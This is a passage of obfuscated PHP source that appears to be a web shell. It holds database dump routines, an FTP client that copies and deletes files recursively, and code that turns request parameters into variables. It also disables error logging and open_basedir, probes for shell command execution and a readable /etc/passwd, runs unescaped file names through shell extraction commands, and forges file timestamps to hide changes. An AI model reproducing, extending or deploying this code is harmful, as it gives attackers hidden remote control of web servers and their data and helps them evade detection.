        switch ($this->db) {
        case 'MySQL':
            $this->dump[0] = '-- MySQL dump';
            if ($this->query('/*' . chr(0) . '*/ SHOW CREATE TABLE `' . $table . '`') != 1) {
                return 0;
            }
            if (!$this->get_result()) {
                return 0;
            }

            $this->dump[] = $this->rows[0]['Create Table'];
            $this->dump[] = '-- ----------------------------------------------- ';
            if ($this->query('/*' . chr(0) . '*/ SELECT * FROM `' . $table . '`') != 1) {
                return 0;
            }
            if (!$this->get_result()) {
                return 0;
            }
            for ($i = 0; $i < $this->num_rows; $i++) {
                foreach ($this->rows[$i] as $k => $v) {
                    $this->rows[$i][$k] = @mysql_real_escape_string($v);
                }
                $this->dump[] = 'INSERT INTO `' . $table . '` (`' . @implode("`, `", $this->columns) . '`) VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
            }
            break;
        case 'MSSQL':
            $this->dump[0] = '-- MSSQL dump';
            if ($this->query('SELECT * FROM ' . $table) != 1) {
                return 0;
            }
            if (!$this->get_result()) {
                return 0;
            }
            for ($i = 0; $i < $this->num_rows; $i++) {
                foreach ($this->rows[$i] as $k => $v) {
                    $this->rows[$i][$k] = @addslashes($v);
                }
                $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
            }
            break;
        case 'PostgreSQL':
            $this->dump[0] = '-- PostgreSQL dump';
            if ($this->query('SELECT * FROM ' . $table) != 1) {
                return 0;
            }
            if (!$this->get_result()) {
                return 0;
            }
            for ($i = 0; $i < $this->num_rows; $i++) {
                foreach ($this->rows[$i] as $k => $v) {
                    $this->rows[$i][$k] = @addslashes($v);
                }
                $this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
            }
            break;
        case 'Oracle':
            $this->dump[0] = '-- ORACLE dump';
            break;
        default:
            return 0;
            break;
        }
        return 1;
    }

    function close() {
        switch ($this->db) {
        case 'MySQL':
            @mysql_close($this->connection);
            break;
        case 'MSSQL':
            @mssql_close($this->connection);
            break;
        case 'PostgreSQL':
            @pg_close($this->connection);
            break;
        case 'Oracle':
            @oci_close($this->connection);
            break;
        }
    }

    function affected_rows() {
        switch ($this->db) {
        case 'MySQL':
            return @mysql_affected_rows($this->res);
            break;
        case 'MSSQL':
            return @mssql_affected_rows($this->res);
            break;
        case 'PostgreSQL':
            return @pg_affected_rows($this->res);
            break;
        case 'Oracle':
            return @ocirowcount($this->res);
            break;
        default:
            return 0;
            break;
        }
    }
}

class ftp {
    var $server = "";
    var $port = 21;
    var $user = "";
    var $userDir = "";
    var $password = "";
    var $connection = "";
    var $passive = false;
    var $systype = "";
    var $mode = FTP_BINARY;
    var $loggedOn = false;
    var $downloadDir = "";

    function ftp($server, $port, $user, $password, $passive = false) {
        $this->server = $server;
        $this->port = $port;
        $this->user = $user;
        $this->password = $password;
        $this->connect();
        $this->setPassive($passive);
    }

    function connect() {
        $this->connection = @ftp_connect($this->server, $this->port);
        $this->loggedOn = @ftp_login($this->connection, $this->user, $this->password);
        $this->systype = @ftp_systype($this->connection);
        return;
    }

    function setPassive($passive) {
        $this->passive = $passive;
        @ftp_pasv($this->connection, $this->passive);
        return;
    }

    function setMode($mode = 1) {
        $this->mode = $mode;
        return;
    }

    function setCurrentDir($dir = false) {
        if ($dir) {
            @ftp_chdir($this->connection, $dir);
        }

        $this->currentDir = z1a(@ftp_pwd($this->connection));
        return $this->currentDir;
    }

    function setDownloadDir($dir) {
        $this->downloadDir = $dir;
        return;
    }

    function chmod($p, $f) {
        return @ftp_site($this->connection, "chmod $p $f");
    }

    function cd($dir) {
        if ($dir == "..") {
            @ftp_cdup($this->connection);
        } else {
            if (!@ftp_chdir($this->connection, $this->currentDir . $dir)) {
                @ftp_chdir($this->connection, $dir);
            }
        }
        $this->currentDir = z1a(@ftp_pwd($this->connection));
        return;
    }

    function is_dir($dir) {
        if (@ftp_chdir($this->connection, $dir)) {
            @ftp_chdir($this->connection, '..');
            return true;
        } else {
            return false;
        }
    }

    function get($file, $dest = '', $t = 0) {
        if ($dest == '') {
            $dest = $this->downloadDir;
        }
        return @ftp_get($this->connection, ($t ? $dest : z1a($dest) . z2h($file)), "$file", $this->mode);
    }

    function getRecursive($src, $dest = '') {
        if ($dest == '') {
            $dest = $this->downloadDir;
        }

        $target = z2h($src);
        $src = z1a($src);
        $dest = z1a($dest) . $target;
        if (!z4q($dest)) {
            @mkdir($dest);
        }

        $list = @ftp_nlist($this->connection, $src);
        for ($x = 0; $x < @count($list); $x++) {
            $o = z2h($list[$x]);
            if ($o != '.' && $o != '..') {
                if ($this->is_dir($src . $o)) {
                    $this->getRecursive($src . $o, $dest);
                } else {
                    $this->get($src . $o, $dest);
                }
            }
        }
    }

    function getObject($src, $dest = '') {
        if ($dest == '') {
            $dest = $this->downloadDir;
        }
        if ($this->is_dir($src)) {
            return $this->getRecursive(z1a($src), $dest);
        } else {
            return $this->get($src, $dest);
        }
    }

    function put($rf, $lf) {
        return (@file_exists($lf) ? @ftp_put($this->connection, $rf, $lf, $this->mode) : false);
    }

    function putRecursive($src, $dest = '') {
        if ($dest == '') {
            $dest = $this->currentDir;
        }

        $target = z2h($src);
        $src = z1a($src);
        $dest = z1a($dest) . $target;
        $this->makeDir($dest);
        $list = z8k($src);
        for ($x = 0; $x < @count($list); $x++) {
            $o = z2h($list[$x]);
            if ($o != "." && $o != "..") {
                if (z4j($src . $o)) {
                    $this->putRecursive($src . $o, $dest);
                } else {
                    $this->put(z1a($dest) . $o, $src . $o);
                }
            }
        }
    }

    function putObject($src, $dest = '') {
        if ($dest == '') {
            $dest = $this->currentDir;
        }

        $target = z2h($src);
        if (z4j($src)) {
            return $this->putRecursive($src, $dest);
        } else {
            return $this->put(z1a($dest) . $target, $src);
        }
    }

    function deleteFile($rf) {
        return @ftp_delete($this->connection, "$rf");
    }

    function deleteObject($obj) {
        $cobj = z2h($obj);
        if ($cobj != '.' && $cobj != '..') {
            if ($this->is_dir($obj)) {
                if ($list = @ftp_nlist($this->connection, "$obj")) {
                    for ($x = 0; $x < @count($list); $x++) {
                        $o = z2h($list[$x]);
                        if ($o != '.' && $o != '..') {
                            $this->deleteObject(z1a($obj) . $o);
                        }
                    }
                }
                @ftp_rmdir($this->connection, "$obj");
            } else {
                $this->deleteFile("$obj");
            }
        }
    }

    function rename($old, $new) {
        return @ftp_rename($this->connection, "$old", "$new");
    }

    function makeDir($dir) {
        return @ftp_mkdir($this->connection, "$dir");
    }

    function parseline($raw) {
        if (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+([0-9]+)[ ]+([^ ]+)[ ]+(.+)[ ]+([0-9]+)[ ]+([a-zA-Z]+[ ]+[0-9]+)[ ]+([0-9:]+)[ ]+(.*)/", $raw, $m)) {
            $l = array(($m[1] == 'd' ? 'd' : ($m[1] == 'l' ? 'l' : 'f')), $m[9], $m[6]);
        } elseif (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+(.*)[ ]+([a-zA-Z0-9 ]+)[ ]+([0-9:]+)[ ]+(.*)/", $raw, $m)) {
            $l = array(($m[1] == 'd' ? 'd' : ($m[1] == 'l' ? 'l' : 'f')), $m[6], $m[3]);
        } elseif (@preg_match("/([0-9\\/-]+)[ ]+([0-9:AMP]+)[ ]+([0-9]*|<DIR>)[ ]+(.*)/", $raw, $m)) {
            $l = array(($m[3] == "<DIR>" ? 'd' : 'f'), $m[4], $m[3]);
        } elseif (@preg_match("/([-]|[d])[ ]+(.{10})[ ]+([^ ]+)[ ]+([0-9]*)[ ]+([a-zA-Z]*[ ]+[0-9]*)[ ]+([0-9:]*)[ ]+(.*)/", $raw, $m)) {
            $l = array(($m[1] == 'd' ? 'd' : 'f'), $m[7], $m[4]);
        } elseif (@preg_match("/([a-zA-Z0-9_-]+)[ ]+([0-9]+)[ ]+([0-9\\/-]+)[ ]+([0-9:]+)[ ]+([a-zA-Z0-9_ -\*]+)[ \\/]+([^\\/]+)/", $raw, $m)) {
            $l = array(($m[5] == "*STMF" ? 'f' : 'd'), $m[6], $m[2]);
        } elseif (@preg_match("/([-dl])([rwxsStT-]{9})[ ]+([0-9]+)[ ]+([a-zA-Z0-9]+)[ ]+([a-zA-Z0-9]+)[ ]+([0-9]+)[ ]+([a-zA-Z]+[ ]+[0-9]+)[ ]+([0-9:]+)[ ](.*)/", $raw, $m)) {
            $l = array(($m[1] == 'd' ? 'd' : ($m[1] == 'l' ? 'l' : 'f')), $m[9], $m[6]);
        } else {
            $l = array();
        }
        if (!@isset($l[1]) || $l[1] == "." || $l[1] == ".." || @substr($raw, 0, 5) == "total") {
            return array();
        }
        return $l;
    }

    function ftpRawList($dir = '') {
        if ($dir == '') {
            $dir = $this->currentDir;
        }

        $files = array();
        $list = @ftp_rawlist($this->connection, "-a " . $dir);
        if (@is_array($list)) {
            $i = 0;
            foreach ($list as $raw) {
                $line = $this->parseline($raw);
                if (@count($line) == 3) {
                    $files[$i] = $line;
                    $i++;
                }
            }
        }
        return $files;
    }
}

if (@version_compare(@phpversion(), '4.1.0') == -1) {
    $_POST = &$HTTP_POST_VARS;
    $_GET = &$HTTP_GET_VARS;
    $_SERVER = &$HTTP_SERVER_VARS;
    $_COOKIE = &$HTTP_COOKIE_VARS;
}
if (@isset($_GET['act']) && $_GET['act'] == "i") {
    $img = $_GET['img'];
    if (!@isset($_GET['getall'])) {
        $img = @str_replace("~", "", $img);
        foreach ($index as $k => $v) {
            if (@in_array($img, $v)) {
                $img = $k;
                break;
            }
        }
        if (@empty($images[$img])) {
            $img = "small_unk";
            if (@isset($_GET['exe']) && $_GET['exe']) {
                $img = "cmd";
            }
        }
        $image = z9n($images[$img]);
        @ob_start();
        $len = @strlen($image);
        @header("Cache-control: public");
        @header("Expires: " . @date("r", @mktime(0, 0, 0, 1, 1, 2030)));
        @header("Cache-control: max-age=" . (60 * 60 * 24 * 7));
        @header('Last-Modified: ' . @date('r'));
        @header('Accept-Ranges: bytes');
        @header('Content-Length: ' . $len);
        @header('Content-type: image/png');
        echo $image;
        @ob_end_flush();
    } else {
        z3l();
        $r = '';
        foreach ($index as $a => $b) {
            foreach ($b as $d) {
                if ($a != $d) {
                    if (@isset($images[$d]) && !@empty($images[$d])) {
                        $r .= z7i(z9j("Remove \$images[" . $d . "]"));
                    }
                }
            }
        }
        if ($r != '') {
            echo z10e($r);
        }
        @natsort($images);
        $k = @array_keys($images);
        $n = 1;
        $r = '';
        foreach ($k as $u) {
            $r .= z7i(z9j(($n++)) . z9j($u) . z9j('<img alt="" src="?act=i&img=' . $u . '" border="0">'));
        }

        echo z10e($r);
        z3x();
    }
    exit();
}
if (@function_exists('error_reporting')) {
    @error_reporting(0);
}
if (@function_exists('ini_set')) {
    @ini_set('display_errors', 0);
    @ini_set('error_log', NULL);
    @ini_set('log_errors', 0);
    @ini_set('file_uploads', 1);
    @ini_set('assert.quiet_eval', 0);
    @ini_set('allow_url_fopen', 1);
    @ini_set('memory_limit', '256M');
    @ini_set('upload_max_filesize', '256M');
    @ini_set('register_globals', 0);
    @ini_set('magic_quotes_sybase', 0);
    @ini_set('magic_quotes_runtime', 0);
    @ini_set('magic_quotes_gpc', 0);
    @ini_set('open_basedir', NULL);
} elseif (function_exists('ini_alter')) {
    @ini_alter('display_errors', 0);
    @ini_alter('error_log', NULL);
    @ini_alter('log_errors', 0);
    @ini_alter('file_uploads', 1);
    @ini_alter('allow_url_fopen', 1);
    @ini_alter('memory_limit', '256M');
    @ini_alter('upload_max_filesize', '256M');
    @ini_alter('register_globals', 0);
    @ini_alter('magic_quotes_sybase', 0);
    @ini_alter('magic_quotes_runtime', 0);
    @ini_alter('magic_quotes_gpc', 0);
    @ini_alter('open_basedir', NULL);
}
if (@function_exists('set_time_limit')) {
    @set_time_limit(0);
} elseif (@function_exists('ini_set')) {
    @ini_set('max_execution_time', 300);
} elseif (function_exists('ini_alter')) {
    @ini_alter('max_execution_time', 300);
}
if (@function_exists('set_magic_quotes_runtime')) {
    @set_magic_quotes_runtime(0);
}
if (get_magic_quotes_gpc()) {
    if (@isset($_FILES) && @count($_FILES) > 0) {
        z3y($_FILES);
    }
    z4h($GLOBALS);
}
@session_start();
@ob_start();
define("start", z10r());
if (@isset($_SESSION['tmps'])) {
    $tmps = $_SESSION['tmps'];
} else {
    $tmps = z6k();
    $_SESSION['tmps'] = $tmps;
}
$tempdir = $tmps[0];
foreach ($_POST as $postk => $postv) {
    if (@substr($postk, 0, 6) == "backf_") {
        $postk = @substr($postk, 6);
        $postv = @urldecode($postv);
    }
    if ($postk == 'merged') {
        $ar_merged = parse_str(base64_decode($postv));
        if (@count($ar_merged) > 0) {
            foreach ($ar_merged as $kkey => $kval) {
                if (!@isset(${$kkey})) {
                    ${$kkey} = @urldecode($kval);
                }
            }
        }
    } else {
        if (!@isset(${$postk})) {
            ${$postk} = $postv;
        }
    }
}
foreach ($_GET as $k => $v) {
    if (!@isset(${$k})) {
        ${$k} = @urldecode($v);
    }
}
if (!@isset($act)) {
    $act = z7x('2', 'default_act');
}
if ($act == "logout") {
    z4y();
}

z4g();
$win = $nix = $linux = 0;
$os = z9a();
if (@preg_match("/^win/i", $os)) {
    $win = 1;
} else {
    $nix = 1;
    if (@preg_match("/linux/i", $os)) {
        $linux = 1;
    }
}
$sh_exec = $safe_exec = 0;
$test_cmd = z9t("echo z_testexec");
if (@strpos($test_cmd, "exec") === 6) {
    $sh_exec = 1;
} elseif ($nix && @preg_match('/successfully executed/', $test_cmd)) {
    $safe_exec = 1;
}
$cuser = z5k();
$saddr = (@isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (@isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '127.0.0.1'));
$yaddr = $_SERVER["REMOTE_ADDR"];
$bsafe = ((!z7r('ini_get') || z8l('safe_mode') || !$sh_exec) ? 1 : 0);
$bopendir = (@count(z9d(@ini_get('open_basedir'))) > 0 ? 1 : 0);
$a_sql = array();
$bmysql = z7r("mysql_connect");
if ($bmysql) {
    $a_sql[] = "MySQL";
}

$bmssql = z7r("mssql_connect");
if ($bmssql) {
    $a_sql[] = "MsSQL";
}

$boracle = z7r("ocilogon");
if ($boracle) {
    $a_sql[] = "Oracle";
}

$bpostgres = z7r("pg_connect");
if ($bpostgres) {
    $a_sql[] = "PostgreSQL";
}

$bpasswd = 0;
if ($nix) {
    if (z0n("/etc/passwd")) {
        $bpasswd = 1;
    }
}
$bcurl = (@extension_loaded('curl') && z7r("curl_init"));
$bfsock = z7r("fsockopen");
$bftp = (z7r("ftp_connect") && z7r("ftp_login"));
$bmail = z7r("mail");
$bziparchive = (z7r("class_exists") && @class_exists("ZipArchive"));
$dtotal = $dused = $dfree = '0B';
if ($act == "d") {
    if (@isset($dt)) {
        $dt = @trim($dt);
        if (!@empty($dt)) {
            switch ($dt) {
            case 'new':
                if (!z4j($d)) {
                    @mkdir($d);
                }
                $act = "ls";
                break;
            case 'chdir':
                if (@isset($tt) && z4j($tt)) {
                    $d = $tt;
                }
                $act = "ls";
                break;
            case 'rename':
                if (@isset($tt) && z4j($tt)) {
                    if (@isset($drename) && $drename && @isset($newname) && !@empty($newname)) {
                        if (z3p($newname) == './') {
                            $newname = z3p($tt) . z2h($newname);
                        } elseif (!z4q(z3p($newname))) {
                            $newname = z3p($tt) . $newname;
                        }
                        if (z4q($newname) && z4j($newname)) {
                            $newname = z1a($newname) . z2h($tt);
                        }
                        $rendirmsg = z2b((@rename($tt, $newname) ? z9s("474", $newname) : z9s("475", $tt)), '0');
                    } else {
                        $showrename1 = 1;
                    }
                }
                $act = "ls";
                break;
            case 'delete':
                if (z4q($tt)) {
                    z8d($tt);
                }
                $act = "ls";
                break;
            case 'functions':
                if (@isset($tt) && z4j($tt)) {
                    $d = $tt;
                }
                $act = "dfunc";
                break;
            case 'bcopy':
                if (@isset($tt) && z4j($tt)) {
                    $abuf = $dt;
                }
                $act = "ls";
                break;
            case 'bcut':
                if (@isset($tt) && z4j($tt)) {
                    $abuf = $dt;
                }
                $act = "ls";
                break;
            case 'bpastecopy':
                $abuf = $dt;
                if (@isset($tt) && z4j($tt)) {
                    $d = $tt;
                }
                $act = "ls";
                break;
            case 'bpastecut':
                $abuf = $dt;
                if (@isset($tt) && z4j($tt)) {
                    $d = $tt;
                }
                $act = "ls";
                break;
            case 'bpasteall':
                $abuf = $dt;
                if (@isset($tt) && z4j($tt)) {
                    $d = $tt;
                }
                $act = "ls";
                break;
            default:
                break;
            }
        }
    }
}
if (!@isset($d) || @empty($d)) {
    $d = @realpath(@dirname(__FILE__));
    z10q();
} elseif (@realpath($d)) {
    $d = @realpath($d);
    z10q();
} elseif (@isset($dold) && @realpath(z1a($dold) . $d)) {
    $d = @realpath(z1a($dold) . $d);
}
if (@empty($d)) {
    $d = @getcwd();
}

$d = z1a($d);
@chdir($d);
if (z7r('disk_free_space') && z7r('disk_total_space')) {
    $free = @disk_free_space($d);
    $total = @disk_total_space($d);
    if ($free === false) {
        $free = 0;
    }
    if ($total === false) {
        $total = 0;
    }
    if ($free < 0) {
        $free = 0;
    }
    if ($total < 0) {
        $total = 0;
    }

    $dfree = @str_replace(" ", "", z7c($free));
    $dtotal = @str_replace(" ", "", z7c($total));
    $dused = @str_replace(" ", "", z7c(($total - $free)));
}
$a_buf = array('bcopy', 'bcut');
$b_buf = array('bpastecopy', 'bpastecut', 'bpasteall');
if (!@isset($use_buffer)) {
    if (@isset($_SESSION['use_buffer'])) {
        $use_buffer = $_SESSION['use_buffer'];
    } else {
        $use_buffer = z7x('4');
    }
} else {
    $use_buffer = (bool) (int) $use_buffer;
    if (!$use_buffer) {
        z0a();
    }
}
$_SESSION['use_buffer'] = $use_buffer;
if ($nix && $sh_exec) {
    if (!@isset($cmd_tar)) {
        if (@isset($_SESSION['cmd_tar'])) {
            $cmd_tar = $_SESSION['cmd_tar'];
        } else {
            $cmd_tar = z8u("tar");
        }
    }
    $_SESSION['cmd_tar'] = $cmd_tar;
    if (!@isset($cmd_unrar)) {
        if (@isset($_SESSION['cmd_unrar'])) {
            $cmd_unrar = $_SESSION['cmd_unrar'];
        } else {
            $cmd_unrar = z8u("unrar");
        }
    }
    $_SESSION['cmd_unrar'] = $cmd_unrar;
    if (!@isset($cmd_unzip)) {
        if (@isset($_SESSION['cmd_unzip'])) {
            $cmd_unzip = $_SESSION['cmd_unzip'];
        } else {
            $cmd_unzip = z8u("unzip");
        }
    }
    $_SESSION['cmd_unzip'] = $cmd_unzip;
    if (!@isset($cmd_gunzip)) {
        if (@isset($_SESSION['cmd_gunzip'])) {
            $cmd_gunzip = $_SESSION['cmd_gunzip'];
        } else {
            $cmd_gunzip = z8u("gunzip");
        }
    }
    $_SESSION['cmd_gunzip'] = $cmd_gunzip;
    if (!@isset($cmd_bunzip2)) {
        if (@isset($_SESSION['cmd_bunzip2'])) {
            $cmd_bunzip2 = $_SESSION['cmd_bunzip2'];
        } else {
            $cmd_bunzip2 = z8u("bunzip2");
        }
    }
    $_SESSION['cmd_bunzip2'] = $cmd_bunzip2;
    if (!@isset($reg_archives)) {
        if (@isset($_SESSION['reg_archives'])) {
            $reg_archives = $_SESSION['reg_archives'];
        } else {
            $reg_archives = '';
            if (!@empty($cmd_unrar)) {
                $reg_archives .= "rar|";
            }
            if (!@empty($cmd_unzip)) {
                $reg_archives .= "zip|";
            }
            if (!@empty($cmd_tar) && !@empty($cmd_gunzip)) {
                $reg_archives .= "tar.gz|tgz|";
            }
            if (!@empty($cmd_tar) && !@empty($cmd_bunzip2)) {
                $reg_archives .= "tar.bz2|";
            }
            if (!@empty($cmd_tar)) {
                $reg_archives .= "tar|";
            }
            if (!@empty($cmd_gunzip)) {
                $reg_archives .= "gz|";
            }
            if (!@empty($cmd_bunzip2)) {
                $reg_archives .= "bz2|";
            }
            if (!@empty($reg_archives)) {
                $reg_archives = @substr($reg_archives, 0, (@strlen($reg_archives) - 1));
            }
        }
    }
    $_SESSION['reg_archives'] = $reg_archives;
}
if ($bziparchive) {
    if (!@isset($reg_archives)) {
        if (@isset($_SESSION['reg_archives'])) {
            $reg_archives = $_SESSION['reg_archives'];
            if (@empty($reg_archives)) {
                $reg_archives = "zip";
            } else {
                $r_e = @explode("|", $reg_archives);
                if (!@in_array("zip", $r_e)) {
                    $reg_archives .= "|zip";
                }
            }
        } else {
            $reg_archives = 'zip';
        }
    }
    $_SESSION['reg_archives'] = $reg_archives;
}
if (!@isset($color_skin)) {
    if (@isset($_SESSION['color_skin'])) {
        $color_skin = $_SESSION['color_skin'];
    } else {
        $color_skin = z7x('5', 'default_skin');
    }
}
$_SESSION['color_skin'] = $color_skin;
if (!@isset($use_images)) {
    if (@isset($_SESSION['use_images'])) {
        $use_images = $_SESSION['use_images'];
    } else {
        $use_images = z7x('5', 'images');
    }
} else {
    $use_images = (bool) (int) $use_images;
}
$_SESSION['use_images'] = $use_images;
if ($use_buffer) {
    if ($act == "f" && @in_array($ft, $a_buf)) {
        $act = 'ls';
        $abuf = $ft;
        $f = $d . $f;
    }
    if (@isset($emptybuf) && $emptybuf) {
        z0a();
    }

    z1g();
    if (@isset($abuf) && @in_array($abuf, $a_buf)) {
        if (@isset($tt)) {
            z1l($tt, $abuf);
        }
        if (@isset($f)) {
            z1l($f, $abuf);
        }
    } elseif (@isset($abuf) && @in_array($abuf, $b_buf)) {
        switch ($abuf) {
        case 'bpastecopy':
            if (@isset($bcopy) && @is_array($bcopy) && @count($bcopy) > 0) {
                foreach ($bcopy as $tcf) {
                    if (z4q($tcf)) {
                        z7b($tcf, (z4j($tcf) ? z1a($d) . z2h($tcf) : z1a($d)));
                    }
                }
            }
            break;
        case 'bpastecut':
            if (@isset($bcut) && @is_array($bcut) && @count($bcut) > 0) {
                foreach ($bcut as $tcf) {
                    if (z4q($tcf)) {
                        z8a($tcf, z1a($d) . (z4j($tcf) ? z2h($tcf) : ''));
                    }

                    z1l($tcf, "bcut");
                }
            }
            break;
        case 'bpasteall':
            if (@isset($bcopy) && @is_array($bcopy) && @count($bcopy) > 0) {
                foreach ($bcopy as $tcf) {
                    if (z4q($tcf)) {
                        z7b($tcf, z1a($d) . (z4j($tcf) ? z2h($tcf) : ''));
                    }
                }
            }
            if (@isset($bcut) && @is_array($bcut) && @count($bcut) > 0) {
                foreach ($bcut as $tcf) {
                    if (z4q($tcf)) {
                        z8a($tcf, z1a($d) . (z4j($tcf) ? z2h($tcf) : ''));
                    }

                    z1l($tcf, "bcut");
                }
            }
            break;
        default:
            break;
        }
    }
    z1w();
    if (@isset($showbuf) && $showbuf) {
        $ls_a = @array_merge($bcopy, $bcut);
    }
}
z3l();
z3b();
z0s();
if ($act == "f" && @isset($ft) && ($ft == "extract" || $ft == "extractzip")) {
    $ff = '';
    if (z4q($d . $f)) {
        $ff = $d . $f;
    } elseif (z4q($f)) {
        $d = z3p($f);
        $f = z2h($f);
        $ff = $d . $f;
    }
    if (@isset($reg_archives) && $reg_archives != '' && @isset($ff)) {
        if (@preg_match('/\.(' . $reg_archives . ')$/i', $f, $m)) {
            if (@isset($m[1])) {
                if ($ft == "extract" && $sh_exec) {
                    switch (@strtolower($m[1])) {
                    case 'rar':
                        z9t("unrar x $ff");
                        break;
                    case 'zip':
                        z9t("unzip $ff");
                        break;
                    case 'tar.bz2':
                        z9t("tar jxf $ff");
                        break;
                    case 'tar.gz':
                        z9t("tar zxf $ff");
                        break;
                    case 'tgz':
                        z9t("tar zxf $ff");
                        break;
                    case 'tar':
                        z9t("tar xf $ff");
                        break;
                    case 'gz':
                        z9t("gunzip $ff");
                        break;
                    case 'bz2':
                        z9t("bunzip2 $ff");
                        break;
                    default:
                        break;
                    }
                } elseif ($ft == "extractzip") {
                    echo z2b((z0j($ff, $d) ? z9s("476", $f) : z9s("477", $f)), '0');
                }
            }
        }
    }
    $act = "ls";
}
if (@isset($rendirmsg) && !@empty($rendirmsg)) {
    echo $rendirmsg;
}
if (@isset($showrename1) && $showrename1) {
    echo z2b(z5c(array("act" => "d", "d", "dt" => "rename", "tt", "drename" => "1"), z10e(z7i(z6x(z8e(z9s("473", z2h($tt))) . z5u("newname", $tt, "9") . z8v(z9s("73"), "7"))), "2")), '0');
}
if ($act == "f" && @isset($ft) && $ft == "rename" && @isset($f) && !@empty($f)) {
    if (@isset($frename) && $frename && @isset($newname) && !@empty($newname)) {
        if (z3p($newname) == './') {
            $newname = z3p($ff) . z2h($newname);
        } elseif (!z4q(z3p($newname))) {
            $newname = z3p($ff) . $newname;
        }
        if (z4q($newname) && z4j($newname)) {
            $newname = z1a($newname) . z2h($ff);
        }
        echo z2b((@rename($ff, $newname) ? z9s("474", $newname) : z9s("475", $ff)), '0');
    } else {
        if (!isset($ff)) {
            if (z4q($d . $f)) {
                $ff = $d . $f;
            } elseif (z4q($f)) {
                $ff = $f;
            }
        }
        echo z2b(z5c(array("act" => "f", "f", "d", "ft" => "rename", "ff", "frename" => "1"), z10e(z7i(z6x(z8e(z9s("473", z2h($ff))) . z5u("newname", $ff, "9") . z8v(z9s("73"), "7"))), "2")), '0');
    }
    $act = "ls";
} elseif ($act == "f" && @isset($ft) && $ft == "delete" && @isset($f) && !@empty($f)) {
    $ff = '';
    if (z4q($d . $f)) {
        $ff = $d . $f;
    } elseif (z4q($f)) {
        $ff = $f;
    }
    if (z4q($ff)) {
        z8d($ff);
    }

    $act = "ls";
}
if (($act == "dfunc" || $act == "f") && ((@isset($st1) && $st1) || @isset($st2) && $st2)) {
    if ($act == "dfunc") {
        $touch = $d;
    } else {
        $touch = $f;
    }
    if (@isset($st2) && $st2 && !@empty($touch) && z4q($touch) && @isset($tmonth) && !@empty($tmonth) && @isset($tday) && !@empty($tday) && @isset($tyear) && !@empty($tyear) && @isset($thour) && !@empty($thour) && @isset($tmin) && !@empty($tmin) && @isset($tsec) && !@empty($tsec)) {
        $sdate = $tday . " " . $tmonth . " " . $tyear . " " . $thour . " hours " . $tmin . " minutes " . $tsec . " seconds";
        $tdate = @strtotime($sdate);
        if (@touch($touch, $tdate, $tdate)) {
            $tmsg = z9s("113", @date("M-d-Y H:i:s", $tdate));
        } else {
            $tmsg = z9s("114");
        }
    }
    if (@isset($st1) && $st1 && z4q($touch) && @isset($copy_from) && !@empty($copy_from) && z4q($copy_from)) {
        if (@touch($touch, @filemtime($copy_from), @filemtime($copy_from))) {
            $tmsg = z9s("113", @date("M-d-Y H:i:s", @filemtime($copy_from)));
        } else {
            $tmsg = z9s("114");
        }
    }
}
if (@isset($chmod_submit) && $chmod_submit && @isset($ctarget)) {
    if (@isset($chmod_val)) {
        @chmod($ctarget, @octdec($chmod_val));
    } else {
        $octet = "0" . @base_convert(($chmod_o["r"] ? "1" : "0") . ($chmod_o["w"] ? "1" : "0") . ($chmod_o["x"] ? "1" : "0") . ($chmod_g["r"] ? "1" : "0") . ($chmod_g["w"] ? "1" : "0") . ($chmod_g["x"] ? "1" : "0") . ($chmod_w["r"] ? "1" : "0") . ($chmod_w["w"] ? "1" : "0") . ($chmod_w["x"] ? "1" : "0"), 2, 8);
        @chmod($ctarget, @octdec($octet));
    }
    if (z7r('clearstatcache')) {
        @clearstatcache();
    }
}
z8j();
if ($act == "dfunc") {
    z2z();
    z1q($d, 0, 1);
    if (z7r('touch')) {
        z2v();
        echo z2b(z9s("124") . z9c() . z4p($d));
        echo z10e(z5n() . (@isset($tmsg) && !@empty($tmsg) ? z7i(z5t(z9c()) . z9j($tmsg)) : '') . z7i(z5c(array("act", "d", "st1" => "1"), z5t(z9s("104")) . z9j(z5u("copy_from", "", "9") . z8v(z9s("112"), "7")))) . z7i(z5c(array("act", "d", "st2" => "1"), z5t(z9s("105")) . z9j(z4a("tmonth", $tmonth_arr, "4", 1) . "-" . z4a("tday", $tday_arr, "4", 1) . "-" . z4a("tyear", $tyear_arr, "4", 1) . z9c(12) . z4a("thour", $thour_arr, "1", 1) . ":" . z4a("tmin", $tmin_arr, "1", 1) . ":" . z4a("tsec", $tsec_arr, "1", 1) . z8v(z9s("112"), "7")))) . z5n(), "2");
    }
}
if ($act == "f" && @isset($ft)) {
    $ft = @trim($ft);
    if (@empty($ft)) {
        $act = "ls";
    }
}
if ($act == "f") {
    if (!@isset($f)) {
        $f = '';
    }
    if (!@isset($ft)) {
        $ft = '';
    }
    if (@isset($readfile)) {
        $d = z3p($readfile);
        $f = z2h($readfile);
    } elseif (@isset($writefile)) {
        $d = z3p($writefile);
        $f = z2h($writefile);
    } elseif ($f != '') {
        $f0 = @substr($f, 0, 1);
        $f1 = @substr($f, 1, 1);
        if ($f0 == "/" || $f1 == ":") {
            $d = z3p($f);
            $f = z2h($f);
        }
    }
    $fmsg = '';
    if (!z4e($d . $f) && z4e($f)) {
        $d = z3p($f);
        $f = z2h($f);
    } elseif (z1a($f) == z1a($d)) {
        $f = '';
        $fmsg = z9s("472");
    } elseif (z3p($f) == z1a($d)) {
        $f = z2h($f);
    }
    z2z();
    if ((!z4j($d . $f) && z0n($d . $f)) || (!z4q($d . $f) && z0v($d) && @isset($ft) && $ft == "new")) {
        $ext = @strtolower(z2h($f, '.'));
        $rft = z4x($f);
        if (@preg_match("/sess_(.*)/", $f)) {
            $rft = "sess";
        }
        if (!@isset($ft) || @empty($ft)) {
            $ft = $rft;
        }
        if ($ft == "new") {
            z9y($d . $f, "");
            $ft = "edit";
        }
        if ($ft == "rcown") {
            $rcmsg = " " . (z2q($d . $f) ? z5i(z9s("290")) : z8z(z9s("291")));
            $ft = "code";
        }
        if (@empty($ft)) {
            $ft = 'functions';
        }

